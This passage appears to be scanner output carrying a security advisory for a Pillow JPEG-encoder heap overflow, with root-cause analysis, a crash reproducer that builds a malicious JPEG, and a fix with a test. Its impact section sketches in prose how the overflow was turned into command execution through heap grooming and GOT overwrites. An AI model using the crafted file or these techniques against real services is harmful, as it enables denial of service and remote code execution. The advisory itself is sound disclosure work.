bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is\n\n```c\n/* jcmarker.c */\n  *(dest-\u003enext_output_byte)++ = (JOCTET)val;\n  if (--dest-\u003efree_in_buffer == 0) { if (!(*dest-\u003eempty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); }\n```\n\ni.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(\u0026buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.\n\nAll three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info[\"icc_profile\"]` (`:238-241`) and stores the COM payload in `im.info[\"comment\"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get(\"comment\", im.info.get(\"comment\"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info[\"icc_profile\"]` and a `tEXt` chunk keyed `comment` becomes `im.info[\"comment\"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert(\"RGB\") → save(\"JPEG\", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `\"Created with GIMP\"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.\n\n### What lies behind the buffer\n\nThe buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo-\u003emain-\u003eprocess_data`) read from bytes the file supplied.\n\n## Impact\n\nAny service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get(\"icc_profile\")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.\n\nIt does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context-\u003ecomment)` at `JpegEncode.c:376` runs the command (14/14, deterministic once groomed). The address knowledge came from separate memory-disclosure bugs in Pillow's TIFF paths that return library pointers in output pixels/tags; those are independent defects with their own fixes, but any such disclosure — present or future — is enough, and this overflow is the only memory *write* either chain needs. Fixing it reduces those leaks to disclosures rather than footholds.\n\n## Reproducing\n\n`repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.\n\nThe script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.\n\nEach file goes through the same application code in a child `python3 -X faulthandler` process:\n\n```python\nim = Image.open(BytesIO(data))\nim.save(BytesIO(), \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n```\n\n1. **Control.** The file has the ICC profile but no COM segment. The save returns normally with exit status 0, which shows that the exact-fit ICC profile alone is harmless.\n2. **PoC.** This is the same file plus a COM segment of 65533 `C` bytes. `JpegImagePlugin._save()` forwards `im.info[\"comment\"]` automatically. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.\n\nExpected output: the control prints `save returned normally` and `-\u003e exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-\u003e exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. A normal return or a Python exception such as `OSError` gives `OK`.\n\n## Suggested fix\n\nThe attached patch guards state 4 the way state 2 guards the EXIF marker: before calling `jpeg_write_marker()` it requires room for the 4-byte marker header plus the comment plus libjpeg's one-byte slack (`emit_byte` must never bring `free_in_buffer` to 0 with a non-suspending destination), and otherwise returns to the caller for a fresh buffer:\n\n```diff\n--- a/src/libImaging/JpegEncode.c\n+++ b/src/libImaging/JpegEncode.c\n@@ -327,6 +327,11 @@\n         case 4:\n \n             if (context-\u003ecomment) {\n+                // check for comment len + 'COM' header bytes\n+                if (context-\u003ecomment_size + 5 \u003e\n+                    context-\u003edestination.pub.free_in_buffer) {\n+                    break;\n+                }\n                 jpeg_write_marker(\n```\n\nThe encoder then returns with the buffer full, `_encode_tile()` calls it again with an empty buffer, and the comment is emitted there. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. The patch therefore also changes `JpegImagePlugin._save()` to reserve `len(comment) + 5` in both sizing branches (added to `bufsize` in the `optimize`/`progressive` branch, and as a third term of the `max()` in the plain branch), and normalises the comment to `bytes` first (`str` is UTF-8-encoded, `None` becomes `b\"\"`) so the length is exact for non-ASCII `str` comments; `encode.c` already UTF-8-encodes `str` via `z#`, so the bytes written are unchanged. A side effect visible to users: comments of up to 65533 bytes now save successfully in cases that previously raised `OSError: broken data stream` because the default buffer was too small. The patch adds `test_icc_big_comment` to `Tests/test_file_jpeg.py`, which round-trips a 65533-byte comment with ICC profiles sized around the exact-fit boundary; it crashes (or raises `OSError`) on the unpatched tree and passes with the patch. With the patch applied to a clean tree and rebuilt, the reproducer no longer triggers, and `Tests/test_file_jpeg.py` and `Tests/test_file_mpo.py` pass.\n\nThe C guard still depends on the Python sizing to avoid a 0-byte/no-error busy loop, exactly as state 2 already does. A more defensive variant would fail with `IMAGING_CODEC_MEMORY` instead of `break` when the marker does not fit and nothing has been written to the current buffer yet (`next_output_byte == buf`), so that a sizing mistake in any caller can never turn into a busy loop. It would also be consistent with `exif`/`xmp` handling for `_save()` to reject comments longer than `MAX_BYTES_IN_MARKER` (65533) with `ValueError(\"Comment is too long\")` rather than leaving it to libjpeg's `JERR_BAD_LENGTH` → `OSError`.\n\nIndependently, the \"+ 1 spare byte\" / \"+ 5\" reasoning in `_save()` under-counts by the 18–20 bytes `jpeg_start_compress()` writes before the EXIF/extra blocks; that is what lets attacker-sized metadata land the buffer on an exact boundary in the first place. The attached patch does not change that accounting.\n\n## The patch\n\nCheck free output-buffer space before writing the JPEG COM marker in ImagingJpegEncode, and size the encoder buffer for the comment in JpegImagePlugin._save\n\nApplies to `src/libImaging/JpegEncode.c` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_jpeg.py b/Tests/test_file_jpeg.py\nindex b361aef2e..f884883c4 100644\n--- a/Tests/test_file_jpeg.py\n+++ b/Tests/test_file_jpeg.py\n@@ -227,6 +227,16 @@ class TestFileJpeg:\n         im1 = self.roundtrip(hopper(), icc_profile=icc_profile)\n         assert im1.info.get(\"icc_profile\") == (icc_profile or None)\n \n+    def test_icc_big_comment(self) -\u003e None:\n+        # The ICC profile may fill the encoder buffer exactly, in which case the\n+        # comment has to be written to the next buffer\n+        comment = b\"C\" * 65533\n+        for n in range(ImageFile.MAXBLOCK - 40, ImageFile.MAXBLOCK - 30):\n+            icc_profile = b\"I\" * n\n+            im = self.roundtrip(hopper(), icc_profile=icc_profile, comment=comment)\n+            assert im.info[\"icc_profile\"] == icc_profile\n+            assert im.info[\"comment\"] == comment\n+\n     def test_large_icc_meta(self, tmp_path: Path) -\u003e None:\n         # https://github.com/python-pillow/Pillow/issues/148\n         # Sometimes the meta data on the icc_profile block is bigger than\ndiff --git a/src/PIL/JpegImagePlugin.py b/src/PIL/JpegImagePlugin.py\nindex 4b8d34ca3..1d9f4c2fa 100644\n--- a/src/PIL/JpegImagePlugin.py\n+++ b/src/PIL/JpegImagePlugin.py\n@@ -805,7 +805,9 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n             )\n             i += 1\n \n-    comment = info.get(\"comment\", im.info.get(\"comment\"))\n+    comment = info.get(\"comment\", im.info.get(\"comment\")) or b\"\"\n+    if isinstance(comment, str):\n+        comment = comment.encode()\n \n     # \"progressive\" is the official name, but older documentation\n     # says \"progression\"\n@@ -856,10 +858,13 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n             bufsize += len(exif) + 5\n         if extra:\n             bufsize += len(extra) + 1\n+        if comment:\n+            bufsize += len(comment) + 5\n     else:\n         # The EXIF info needs to be written as one block, + APP1, + one spare byte.\n-        # Ensure that our buffer is big enough. Same with the icc_profile block.\n-        bufsize = max(len(exif) + 5, len(extra) + 1)\n+        # Ensure that our buffer is big enough. Same with the icc_profile block\n+        # and the comment (COM marker).\n+        bufsize = max(len(exif) + 5, len(extra) + 1, len(comment) + 5)\n \n     ImageFile._save(\n         im, fp, [ImageFile._Tile(\"jpeg\", (0, 0, *im.size), 0, rawmode)], bufsize\ndiff --git a/src/libImaging/JpegEncode.c b/src/libImaging/JpegEncode.c\nindex 098e431fc..b6771c6ec 100644\n--- a/src/libImaging/JpegEncode.c\n+++ b/src/libImaging/JpegEncode.c\n@@ -327,6 +327,11 @@ ImagingJpegEncode(Imaging im, ImagingCodecState state, UINT8 *buf, int bytes) {\n         case 4:\n \n             if (context-\u003ecomment) {\n+                // check for comment len + 'COM' header bytes\n+                if (context-\u003ecomment_size + 5 \u003e\n+                    context-\u003edestination.pub.free_in_buffer) {\n+                    break;\n+                }\n                 jpeg_write_marker(\n                     \u0026context-\u003ecinfo,\n                     JPEG_COM,\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 3,343 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# Pillow heap buffer overflow in ImagingJpegEncode() (src/libImaging/JpegEncode.c, case 4).\n#\n# Re-saving a JPEG with its own ICC profile, the usual \"keep the colours\" re-encode:\n#     im = Image.open(f); im.save(out, \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n# If the ICC segment fills the 65536-byte encoder buffer to the last byte, the COM\n# marker (forwarded from im.info[\"comment\"] automatically) is written with\n# free_in_buffer == 0. libjpeg stores the byte, then decrements the counter, which\n# wraps to ~2^64, and the comment plus the whole compressed image go past the end\n# of the heap buffer. The Python process dies with SIGSEGV or a glibc abort.\n#\n# Runs against the stock build in /src, no rebuild. Takes about 2 seconds.\nimport random\nimport struct\nimport subprocess\nimport sys\nfrom io import BytesIO\n\nfrom PIL import Image\n\n# Output-buffer layout at the moment the COM marker is written:\nENCODER_BUFFER = 65536  # ImageFile.MAXBLOCK; _save() never makes it bigger here\nJFIF_HEADER = 20  # SOI + JFIF APP0, written by jpeg_start_compress()\nICC_OVERHEAD = 18  # FFE2 \u003clen\u003e \"ICC_PROFILE\\0\" \u003cseq\u003e \u003ccount\u003e\nICC_PAYLOAD = ENCODER_BUFFER - JFIF_HEADER - ICC_OVERHEAD  # 65498: exact fit\nCOMMENT = b\"C\" * 65533  # largest legal COM; content and length chosen by the file\n\n# What the victim application does with an uploaded file, run in a child process\n# so that we can see it die.\nRESAVE = \"\"\"\nimport sys\nfrom io import BytesIO\nfrom PIL import Image\nim = Image.open(BytesIO(sys.stdin.buffer.read()))\nim.save(BytesIO(), \"JPEG\", icc_profile=im.info[\"icc_profile\"])\nprint(\"save returned normally\")\n\"\"\"\n\n\ndef segment(marker, payload):\n    return bytes([0xFF, marker]) + struct.pack(\"\u003eH\", len(payload) + 2) + payload\n\n\ndef make_jpeg(with_comment):\n    \"\"\"A valid 256x256 JPEG: an ICC profile of ICC_PAYLOAD bytes, optionally a COM.\"\"\"\n    noise = random.Random(1234).randbytes(256 * 256 * 3)  # ~100 KB of image data\n    out = BytesIO()\n    Image.frombytes(\"RGB\", (256, 256), noise).save(out, \"JPEG\", quality=95)\n    plain = out.getvalue()\n\n    icc = segment(0xE2, b\"ICC_PROFILE\\0\\x01\\x01\" + b\"I\" * ICC_PAYLOAD)\n    com = segment(0xFE, COMMENT) if with_comment else b\"\"\n    return plain[:2] + icc + com + plain[2:]  # splice in right after SOI\n\n\ndef resave(jpeg):\n    # -X faulthandler: on a fatal signal, print where in Python the child died\n    cmd = [sys.executable, \"-X\", \"faulthandler\", \"-c\", RESAVE]\n    r = subprocess.run(cmd, input=jpeg, capture_output=True)\n    print((r.stdout + r.stderr).decode(errors=\"replace\").strip())\n    print(f\"-\u003e exit status {r.returncode}\")\n    return r.returncode\n\n\n# Control: the same file without a COM segment re-saves fine, so the buffer\n# sizing and the ICC profile on their own are harmless.\nprint(\"Control: re-save the JPEG without a comment\")\nresave(make_jpeg(with_comment=False))\n\n# The bug: add a COM segment. The comment is now written into a buffer that has\n# no room left.\nprint(f\"\\nPoC: re-save the JPEG with a {len(COMMENT)}-byte comment\")\nrc = resave(make_jpeg(with_comment=True))\n\n# A negative return code means the child was killed by a signal (SIGSEGV or\n# SIGABRT from glibc's heap checks), not by a Python exception.\nif rc \u003c 0:\n    print(f\"\\nim.save() killed the process with signal {-rc}: out-of-bounds heap write\")\n    print(\"BUG\")\nelse:\n    print(\"OK\")\n```\n\u003c/details\u003e\n\n---"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-96778](https://osv.dev/CVE-2026-96778)**.\n\n## [GHSA-g7cr-3p24-7wf7](https://osv.dev/GHSA-g7cr-3p24-7wf7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e Heap buffer overflow writing JPEG comment after ICC profile fills buffer\n\u003e Location: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e A heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.\n\u003e \n\u003e The bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.\n\u003e \n\u003e Triggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.\n\u003e \n\u003e The attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.\n\u003e \n\u003e The unguarded call was introduced in e50ae85ea406 (\"Use jpeg_write_marker to write comment\", 2022-12-05) and first shipped in 9.4.0.\n\u003e \n\u003e ## Details\n\u003e \n\u003e `ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the \"extra\" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the \"buffer full\" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.\n\u003e \n\u003e A JPEG laid out as\n\u003e \n\u003e ```\n\u003e FFD8                                   SOI\n\u003e FFE2 \u003clen\u003e \"ICC_PROFILE\\0\" 01 01 \u003c65498 bytes\u003e     -\u003e im.info[\"icc_profile\"]\n\u003e FFFE \u003clen\u003e \u003ccomment, any length 1..65533\u003e           -\u003e im.info[\"comment\"]\n\u003e \u003cany baseline RGB JPEG body\u003e\n\u003e ```\n\u003e \n\u003e opened with `Image.open()` and re-saved with the usual colour-profile-preserving call\n\u003e \n\u003e ```python\n\u003e im.save(out, \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))\n\u003e ```\n\u003e \n\u003e kills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.\n\u003e \n\u003e ### Code path\n\u003e \n\u003e The buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:\n\u003e \n\u003e ```python\n\u003e # src/PIL/JpegImagePlugin.py:859-862\n\u003e     else:\n\u003e         # The EXIF info needs to be written as one block, + APP1, + one spare byte.\n\u003e         # Ensure that our buffer is big enough. Same with the icc_profile block.\n\u003e         bufsize = max(len(exif) + 5, len(extra) + 1)\n\u003e ```\n\u003e \n\u003e `ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).\n\u003e \n\u003e The \"+1 spare byte\" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(\u0026cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:\n\u003e \n\u003e ```c\n\u003e // src/libImaging/JpegEncode.c:302-337\n\u003e         case 3:\n\u003e             if (context-\u003eextra) {\n\u003e                 unsigned int n = context-\u003eextra_size - context-\u003eextra_offset;\n\u003e                 if (n \u003e context-\u003edestination.pub.free_in_buffer) {\n\u003e                     n = context-\u003edestination.pub.free_in_buffer;\n\u003e                 }\n\u003e                 memcpy(context-\u003edestination.pub.next_output_byte, context-\u003eextra + context-\u003eextra_offset, n);\n\u003e                 context-\u003edestination.pub.next_output_byte += n;\n\u003e                 context-\u003edestination.pub.free_in_buffer -= n;\n\u003e                 context-\u003eextra_offset += n;\n\u003e                 if (context-\u003eextra_offset \u003e= context-\u003eextra_size) {\n\u003e                     state-\u003estate++;                 // done -\u003e fall into case 4, even with free_in_buffer == 0\n\u003e                 } else {\n\u003e                     break;\n\u003e                 }\n\u003e             } …\n\u003e \n\u003e         case 4:\n\u003e             if (context-\u003ecomment) {\n\u003e                 jpeg_write_marker(\u0026context-\u003ecinfo, JPEG_COM,\n\u003e                                   (unsigned char *)context-\u003ecomment, context-\u003ecomment_size);   // :330 — no space check\n\u003e             }\n\u003e             state-\u003estate++;\n\u003e \n\u003e         case 5:\n\u003e             if (1024 \u003e context-\u003edestination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64\n\u003e                 break;\n\u003e             }\n\u003e             … jpeg_write_scanlines(…) …\n\u003e ```\n\u003e \n\u003e Every other emitting state is guarded — state 2 requires `rawExifLen + 5 \u003c= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` (\"Use jpeg_write_marker to write comment\", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.\n\u003e \n\u003e With 20 header bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is\n\u003e \n\u003e ```c\n\u003e /* jcmarker.c */\n\u003e   *(dest-\u003enext_output_byte)++ = (JOCTET)val;\n\u003e   if (--dest-\u003efree_in_buffer == 0) { if (!(*dest-\u003eempty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); }\n\u003e ```\n\u003e \n\u003e i.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(\u0026buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.\n\u003e \n\u003e All three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info[\"icc_profile\"]` (`:238-241`) and stores the COM payload in `im.info[\"comment\"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get(\"comment\", im.info.get(\"comment\"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info[\"icc_profile\"]` and a `tEXt` chunk keyed `comment` becomes `im.info[\"comment\"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert(\"RGB\") → save(\"JPEG\", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `\"Created with GIMP\"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.\n\u003e \n\u003e ### What lies behind the buffer\n\u003e \n\u003e The buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo-\u003emain-\u003eprocess_data`) read from bytes the file supplied.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get(\"icc_profile\")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.\n\u003e \n\u003e It does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context-\u003ecomment)` at 